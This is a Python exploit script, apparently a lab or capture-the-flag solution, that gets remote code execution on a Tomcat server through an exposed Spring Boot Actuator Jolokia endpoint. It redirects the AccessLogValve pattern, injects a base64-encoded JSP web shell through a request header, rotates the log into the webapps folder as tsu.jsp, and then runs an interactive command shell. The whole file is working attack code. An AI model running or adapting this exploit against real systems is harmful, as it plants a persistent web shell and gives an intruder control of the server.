import requests
import sys
import json
import base64

proxi = {
	"http":"http://localhost:8081",
	"https":"http://localhost:8081"
}
# Get web base dir
def getRootPath(url):
	data = {
		"type":"EXEC",
		"mbean":"com.sun.management:type=DiagnosticCommand",
		"operation":"vmSystemProperties",
		"arguments":[]
	}
	r = requests.post(url, json=data, headers={"Content-Type":"application/json"})
	res = json.loads(r.text)
	for i in res["value"].split("\n"):
		if "catalina.base=" in i:
			base = i
	return base.split("=")[1]

# Define which log pattern to write
# https://i.blackhat.com/eu-19/Wednesday/eu-19-An-Far-Sides-Of-Java-Remote-Protocols.pdf
# https://tomcat.apache.org/tomcat-7.0-doc/api/org/apache/catalina/valves/AccessLogValve.html
def setLogPattern(url):
	data = {
		"type":"WRITE",
		"mbean":"Catalina:type=Valve,host=localhost,name=AccessLogValve",
		"attribute":"pattern",
		"value":"%{tsu}i"
	}
	r = requests.post(url, json=data, headers={"Content-Type":"application/json"}, proxies=proxi)

def poisonLogViaCookie(url):
	shell = "PCVAIHBhZ2UgaW1wb3J0PSJqYXZhLnV0aWwuKixqYXZhLmlvLioiJT48JSBQcm9jZXNzIHA9UnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpO091dHB1dFN0cmVhbSBvcyA9IHAuZ2V0T3V0cHV0U3RyZWFtKCk7SW5wdXRTdHJlYW0gaW4gPSBwLmdldElucHV0U3RyZWFtKCk7RGF0YUlucHV0U3RyZWFtIGRpcyA9IG5ldyBEYXRhSW5wdXRTdHJlYW0oaW4pO1N0cmluZyBkaXNyID0gZGlzLnJlYWRMaW5lKCk7d2hpbGUgKCBkaXNyICE9IG51bGwpIHtvdXQucHJpbnRsbihkaXNyKTtkaXNyID0gZGlzLnJlYWRMaW5lKCk7fSU+"
	header = {'tsu': base64.b64decode(shell).decode('utf-8') }
	r = requests.get(url, headers=header,  proxies=proxi)

def rotateLog(url, path):
	data = {
		"type":"EXEC",
		"mbean":"Catalina:type=Valve,host=localhost,name=AccessLogValve",
		"operation":"rotate(java.lang.String)",
		"arguments":["%s/webapps/vulnapp/tsu.jsp"%path]
	}	
	r = requests.post(url, json=data, headers={"Content-Type":"application/json"},  proxies=proxi)

def shell(url, cmd):
	url = "%s/tsu.jsp?cmd="%url+cmd
	r = requests.get(url)
	res = r.text.split("-")[-1]
	print(res.strip())

if len(sys.argv) < 2:
	print("python3 solv_logwrite.py <url>")
	exit()

try:
	url = sys.argv[1]+"/actuator/jolokia"
	root = getRootPath(url)
	setLogPattern(url)
	poisonLogViaCookie(sys.argv[1])
	rotateLog(url, root)
	while True:
		cmd = input("$ ")
		shell(sys.argv[1], cmd)
except:
	print("Something wrong")


